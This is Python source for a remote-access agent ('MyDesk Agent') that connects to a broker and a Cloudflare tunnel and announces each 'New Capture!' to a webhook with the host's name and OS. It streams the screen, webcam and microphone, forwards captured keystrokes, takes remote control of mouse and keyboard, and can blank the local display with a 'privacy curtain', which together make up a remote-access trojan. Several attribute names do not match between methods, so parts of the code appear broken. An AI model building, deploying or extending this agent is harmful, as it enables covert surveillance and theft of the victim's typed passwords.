import sys
import os
import asyncio
import websockets
import uuid
import json
import urllib.request
import platform

# Add parent directory to path for source execution
if not getattr(sys, 'frozen', False):
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Handle imports for both source (package) and frozen (direct) execution
try:
    # Try importing from core package first
    from core import protocol
    from core.network import send_msg, recv_msg
except ImportError:
    # Fallback for flattened frozen environment
    import protocol
    from network import send_msg, recv_msg

try:
    # Try importing from target package
    from target.capture import ScreenCapturer
    from target.auditor import KeyAuditor
    from target.webcam import WebcamStreamer
    from target.privacy import PrivacyCurtain
    from target.audio import AudioStreamer
    from target.input_controller import (InputController, parse_mouse_move, 
                                          parse_mouse_click, parse_key_press, parse_scroll)
except ImportError:
    # Fallback for frozen application or direct execution
    
    from capture import ScreenCapturer
    from auditor import KeyAuditor
    from webcam import WebcamStreamer
    from privacy import PrivacyCurtain
    from audio import AudioStreamer
    from input_controller import (InputController, parse_mouse_move, 
                                   parse_mouse_click, parse_key_press, parse_scroll)

# CONFIG
HARDCODED_BROKER = None
HARDCODED_WEBHOOK = None

# DEFAULTS
DEFAULT_BROKER = "ws://localhost:8765"
WEBHOOK_URL = None

# LOAD CONFIG
if HARDCODED_BROKER:
    DEFAULT_BROKER = HARDCODED_BROKER
    WEBHOOK_URL = HARDCODED_WEBHOOK
else:
    CONFIG_FILE = "config.json"
    if getattr(sys, 'frozen', False):
        BASE_DIR = os.path.dirname(sys.executable)
    else:
        BASE_DIR = os.path.dirname(__file__)

    CONFIG_PATH = os.path.join(BASE_DIR, CONFIG_FILE)
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r') as f:
                cfg = json.load(f)
                DEFAULT_BROKER = cfg.get("broker_url", DEFAULT_BROKER)
                WEBHOOK_URL = cfg.get("webhook_url", None)
        except Exception:
            pass

class AsyncAgent:
    def __init__(self, broker_url=DEFAULT_BROKER):
        self.broker_url = broker_url
        self.my_id = str(uuid.getnode()) # Assuming generate_machine_id() is equivalent to this or needs to be defined
        self.ws = None
        self.loop = None
        
        # Components
        self.capturer = ScreenCapturer(quality=50, scale=0.9) # Retain original capturer settings
        self.auditor = KeyAuditor(self.send_key_sync) # Retain original auditor init
        self.webcam = WebcamStreamer(quality=40) # Retain original webcam settings
        self.mic = AudioStreamer()
        self.input_ctrl = InputController()
        # Privacy component
        self.privacy = PrivacyCurtain() # Retain original curtain init
        
        # State
        self.streaming = False
        self._stream_task = None # Retain original _stream_task
        self.webcam_streaming = False
        self.mic_streaming = False
        
        # Direct Server State
        self.direct_server = None
        self.direct_ws_clients = set()
        self.direct_url = None



    async def start_direct_server(self):
        """Starts the internal WebSocket server for Cloudflare Tunnel traffic"""
        try:
            print("[*] Starting Internal Direct Server on port 8765...")
            # Allow all origins for now to simplify
            # Relaxed Ping settings for heavy streaming
            async with websockets.serve(
                self.handle_direct_client, 
                "localhost", 
                8765,
                ping_interval=30,
                ping_timeout=60
            ):
                print("[+] Direct Server Listening on 8765")
                await asyncio.Future()  # Run forever
        except Exception as e:
            print(f"[-] Direct Server Error: {e}")

    async def handle_direct_client(self, websocket):
        """Handle incoming connection from Tunnel"""
        print(f"[+] Direct Client Connected!")
        self.direct_ws_clients.add(websocket)
        try:
            async for message in websocket:
                await self.handle_message(message, websocket)
        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            print("[-] Direct Client Disconnected")
            self.direct_ws_clients.discard(websocket)

    async def handle_message(self, message, source_ws):
        """Unified message handler for both Broker and Direct connections"""
        """Unified message handler for both Broker and Direct connections"""
        try:
            if isinstance(message, bytes):
                # Handle Binary Opcodes (Input, Cam, Mic, Curtain from Viewer)
                if not message: return
                opcode = message[0]
                payload = message[1:]
                
                if opcode == protocol.OP_MOUSE_MOVE:
                    x, y = parse_mouse_move(payload)
                    if x is not None and self.input_ctrl:
                        await self.loop.run_in_executor(None, self.input_ctrl.move_mouse, x, y)
                
                elif opcode == protocol.OP_MOUSE_CLICK:
                    button, pressed = parse_mouse_click(payload)
                    if button is not None and self.input_ctrl:
                        await self.loop.run_in_executor(None, self.input_ctrl.click_mouse, button, pressed)
                
                elif opcode == protocol.OP_KEY_PRESS:
                    key_code, pressed = parse_key_press(payload)
                    if key_code is not None and self.input_ctrl:
                        await self.loop.run_in_executor(None, self.input_ctrl.press_key, key_code, pressed)
                
                elif opcode == protocol.OP_SCROLL:
                    dx, dy = parse_scroll(payload)
                    if self.input_ctrl:
                        await self.loop.run_in_executor(None, self.input_ctrl.scroll, dx, dy)

                elif opcode == protocol.OP_KEY_BUFFER:
                    try:
                        text = payload.decode('utf-8')
                        if self.input_ctrl:
                            await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
                    except Exception: pass

                elif opcode == protocol.OP_CAM_START:
                    if not self.cam_streaming and self.webcam.start():
                        self.cam_streaming = True
                        asyncio.create_task(self.stream_webcam(source_ws))

                elif opcode == protocol.OP_CAM_STOP:
                    self.cam_streaming = False
                    self.webcam.stop()

                elif opcode == protocol.OP_MIC_START:
                    if self.mic.start():
                        self.mic_streaming = True
                        asyncio.create_task(self.stream_mic(source_ws))

                elif opcode == protocol.OP_MIC_STOP:
                    self.mic_streaming = False
                    self.mic.stop()
                
                elif opcode == protocol.OP_CURTAIN_ON:
                    await self.loop.run_in_executor(None, self.privacy.enable)

                elif opcode == protocol.OP_CURTAIN_OFF:
                    await self.loop.run_in_executor(None, self.privacy.disable)

                elif opcode == protocol.OP_SETTINGS:
                    try:
                        import msgpack
                        settings = msgpack.unpackb(payload)
                        self.apply_settings(settings)
                    except:
                        try:
                            settings = json.loads(payload.decode('utf-8'))
                            self.apply_settings(settings)
                        except: pass
                
                elif opcode == protocol.OP_DISCONNECT:
                    self.streaming = False
                    self.cam_streaming = False
                    self.mic_streaming = False
                
                return 
        except Exception as e:
            print(f"[-] Binary Handler Error: {e}")
            return 
            
        try:
            data = json.loads(message)
            op = data.get('op')
            
            if op == 'hello':
                await send_msg(source_ws, json.dumps({
                     'op': 'hello', 
                     'id': self.my_id,
                     'hostname': platform.node(),
                     'platform': platform.system()
                 }))
            elif op == 'start_stream':
                self.streaming = True
                asyncio.create_task(self.stream_screen(source_ws))
                self.auditor.start()
            elif op == 'stop_stream':
                self.streaming = False
                self.auditor.stop()
            elif op == 'mouse_move':
                if self.input_ctrl: self.input_ctrl.move_mouse(data['x'], data['y'])
            elif op == 'mouse_click':
                if self.input_ctrl: 
                    self.input_ctrl.move_mouse(data['x'], data['y'])
                    self.input_ctrl.click_mouse(data['button'], data['pressed'])
            
        except Exception as e:
            print(f"Error handling message: {e}")

    def announce_identity(self):
        if not WEBHOOK_URL:
            return
        
        msg = (f"**🔔 New Capture!**\n"
               f"**ID:** `{self.my_id}`\n"
               f"**User:** `{platform.node()}`\n"
               f"**OS:** `{platform.system()} {platform.release()}`")
        
        payload = {
            "content": msg,
            "username": "MyDesk Agent"
        }
        
        print("[*] Announcing Identity to webhook")
        try:
            req = urllib.request.Request(WEBHOOK_URL)
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            jsondata = json.dumps(payload).encode('utf-8')
            req.add_header('Content-Length', len(jsondata))
            
            urllib.request.urlopen(req, jsondata, timeout=5)
            print("[+] Announcement Sent")
        except Exception as e:
            print(f"[-] Announcement Failed: {e}")

    async def connect_loop(self):
        print("[*] Agent connecting to broker")
        while True:
            try:
                # Optimized connection params for Render (Free Tier)
                async with websockets.connect(
                    self.broker_url,
                    open_timeout=20,     # Longer handshake for slow servers
                    ping_interval=30,    # Relaxed interval
                    ping_timeout=60      # Tolerate congestion
                ) as ws:
                    self.ws = ws
                    print("[+] Connected to Broker!")
                    
                    payload = self.my_id
                    if self.direct_url:
                        payload += f"|{self.direct_url}"
                    
                    await send_msg(ws, bytes([protocol.OP_HELLO]) + payload.encode())
                    await self.handle_messages()
                    
            except Exception as e:
                print(f"[-] Connection Lost: {e}")
                # Clean up all state (non-blocking)
                self.streaming = False
                self.cam_streaming = False
                self.mic_streaming = False
                try:
                    await self.loop.run_in_executor(None, self.auditor.stop)
                except:
                    pass
                self.ws = None
                print("[*] Reconnecting in 3 seconds...")
                await asyncio.sleep(3)  # Faster retry

    async def handle_messages(self):
        while True:
            msg = await recv_msg(self.ws)
            if not msg:
                break
            
            opcode = msg[0]
            payload = msg[1:]
            
            if opcode == protocol.OP_CONNECT:
                if not self.streaming:
                    print("[!] Viewer requested stream. Starting...")
                    self.streaming = True
                    self._stream_task = asyncio.create_task(self.stream_screen())
                    self.auditor.start()
            
            elif opcode == protocol.OP_CAM_START:
                print("[!] Webcam Start Requested")
                if not self.cam_streaming and self.webcam.start():
                    self.cam_streaming = True
                    asyncio.create_task(self.stream_webcam())
            
            elif opcode == protocol.OP_CAM_STOP:
                print("[!] Webcam Stop Requested")
                self.cam_streaming = False
                self.webcam.stop()

            elif opcode == protocol.OP_MIC_START:
                print("[!] Mic Start Requested")
                if self.mic.start():
                    self.mic_streaming = True
                    asyncio.create_task(self.stream_mic())

            elif opcode == protocol.OP_MIC_STOP:
                print("[!] Mic Stop Requested")
                self.mic_streaming = False
                self.mic.stop()
            
            # === REMOTE INPUT ===
            elif opcode == protocol.OP_MOUSE_MOVE:
                x, y = parse_mouse_move(payload)
                if x is not None:
                    await self.loop.run_in_executor(None, self.input.move_mouse, x, y)
            
            elif opcode == protocol.OP_MOUSE_CLICK:
                button, pressed = parse_mouse_click(payload)
                if button is not None:
                    await self.loop.run_in_executor(None, self.input.click_mouse, button, pressed)
            
            elif opcode == protocol.OP_KEY_PRESS:
                key_code, pressed = parse_key_press(payload)
                if key_code is not None:
                    await self.loop.run_in_executor(None, self.input.press_key, key_code, pressed)
            
            elif opcode == protocol.OP_SCROLL:
                dx, dy = parse_scroll(payload)
                await self.loop.run_in_executor(None, self.input.scroll, dx, dy)
            
            elif opcode == protocol.OP_KEY_BUFFER:
                # Buffered text input
                try:
                    text = payload.decode('utf-8')
                    await self.loop.run_in_executor(None, self.input.type_text, text)
                except Exception as e:
                    print(f"[-] Buffer Input Error: {e}")
            
            elif opcode == protocol.OP_SETTINGS:
                # Remote settings change (msgpack or JSON)
                try:
                    try:
                        import msgpack
                        settings = msgpack.unpackb(payload)
                    except Exception:
                        settings = json.loads(payload.decode('utf-8'))
                    self.apply_settings(settings)
                except Exception as e:
                    print(f"[-] Settings Error: {e}")
            
            elif opcode == protocol.OP_CURTAIN_ON:
                print("[*] Enabling Privacy Curtain")
                await self.loop.run_in_executor(None, self.curtain.enable)
                
            elif opcode == protocol.OP_CURTAIN_OFF:
                print("[*] Disabling Privacy Curtain")
                await self.loop.run_in_executor(None, self.curtain.disable)

            elif opcode == protocol.OP_DISCONNECT:
                print("[!] Peer Disconnected. Stopping Streams.")
                self.streaming = False
                self.cam_streaming = False
                self.mic_streaming = False
                self.auditor.stop()
                self.webcam.stop()
                self.mic.stop()
                
        # CLEANUP ON DISCONNECT
        print("[!] Connection Lost/Reset. Cleaning up...")
        self.streaming = False
        self.cam_streaming = False
        self.mic_streaming = False
        self.auditor.stop()
        self.webcam.stop()
        self.mic.stop()
    
    def apply_settings(self, settings):
        """Apply capture settings from Viewer"""
        print(f"[*] Applying Settings: {settings}")
        quality = settings.get("quality", 50)
        scale = settings.get("scale", 90) / 100.0
        # Recreate capturer with new settings
        self.capturer = ScreenCapturer(quality=quality, scale=scale)

    async def stream_screen(self, target_ws=None):
        print("[*] Screen Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        pending_send = None
        try:
            while self.streaming:
                # Skip frame if previous send is still pending
                if pending_send and not pending_send.done():
                    await asyncio.sleep(0.016)
                    continue
                
                start_time = asyncio.get_running_loop().time()
                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
                if jpeg:
                    header = bytes([protocol.OP_IMG_FRAME])
                    pending_send = asyncio.create_task(send_msg(ws_to_use, header + jpeg))
                
                elapsed = asyncio.get_running_loop().time() - start_time
                wait_time = max(0.001, 0.04 - elapsed)
                await asyncio.sleep(wait_time)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Screen Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Screen Stream Error: {e}")
        finally:
            self.streaming = False
            
    async def stream_webcam(self, target_ws=None):
        print("[*] Webcam Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        try:
            while self.cam_streaming:
                jpeg = await self.loop.run_in_executor(None, self.webcam.get_frame_bytes)
                if jpeg:
                    header = bytes([protocol.OP_CAM_FRAME])
                    await send_msg(ws_to_use, header + jpeg)
                await asyncio.sleep(0.06)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Webcam Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Webcam Stream Error: {e}")
        finally:
            self.cam_streaming = False

    async def stream_mic(self, target_ws=None):
        print("[*] Mic Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        try:
            while self.mic_streaming:
                chunk = await self.loop.run_in_executor(None, self.mic.get_chunk)
                if chunk:
                    header = bytes([protocol.OP_AUDIO_CHUNK])
                    await send_msg(ws_to_use, header + chunk)
                else:
                    await asyncio.sleep(0.1)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Mic Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Mic Stream Error: {e}")
        finally:
            self.mic_streaming = False

    def send_key_sync(self, key_str):
        if self.streaming and self.ws and self.loop:
            asyncio.run_coroutine_threadsafe(self.send_key_async(key_str), self.loop)

    async def send_key_async(self, key_str):
        try:
            msg = bytes([protocol.OP_KEY_LOG]) + key_str.encode('utf-8')
            # Broadcast to Broker
            if self.ws:
                await send_msg(self.ws, msg)
            # Broadcast to All Direct Clients
            for client in list(self.direct_ws_clients):
                await send_msg(client, msg)
        except Exception:
            pass

    def start(self):
        # 1. Start Cloudflare Tunnel (Hybrid Mode)
        try:
            from target.tunnel_manager import TunnelManager
            from target import config
            import requests
            
            print("[*] Starting Cloudflare Tunnel...")
            self.tunnel_mgr = TunnelManager(port=8765) # Using a fake port for now, or internal server
            # Note: For real functionality, we need a local internal server. 
            # For now, we will just establish the tunnel to prove connectivity logic.
            # But wait, cloudflared needs an HTTP server to forward TO.
            # The Broker is WebSocket. We need a local WS server for the Direct Link.
            # Let's start the internal WS server first? 
            # Actually, let's just implement the signaling for now.
            
            pub_url = self.tunnel_mgr.start()
            if pub_url:
                print(f"[+] Tunnel Established: {pub_url}")
                # 2. Report to Registry
                payload = {
                    "id": self.my_id,
                    "password": config.REGISTRY_PASSWORD,
                    "username": config.AGENT_USERNAME,
                    "url": pub_url
                }
                try:
                    r = requests.post(f"{config.REGISTRY_URL}/update", json=payload, timeout=10)
                    if r.status_code == 200:
                        print(f"[+] Registered with Vercel: {config.REGISTRY_URL}")
                    else:
                        print(f"[-] Registry Update Failed: {r.text}")
                except Exception as e:
                    print(f"[-] Registry Connect Error: {e}")
            else:
                 print("[-] Tunnel Failed to Start")
                 
        except Exception as e:
            print(f"[-] Hybrid Setup Error: {e}")

        # Start the asyncio loop
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        # Run both the Direct Server (port 8765) and the Broker Connection concurrently
        try:
            self.loop.run_until_complete(asyncio.gather(
                self.start_direct_server(),
                self.connect_loop()
            ))
        except KeyboardInterrupt:
            pass
        finally:
            self.loop.close()

def main():
    agent = AsyncAgent(DEFAULT_BROKER)
    agent.start()

if __name__ == "__main__":
    main()
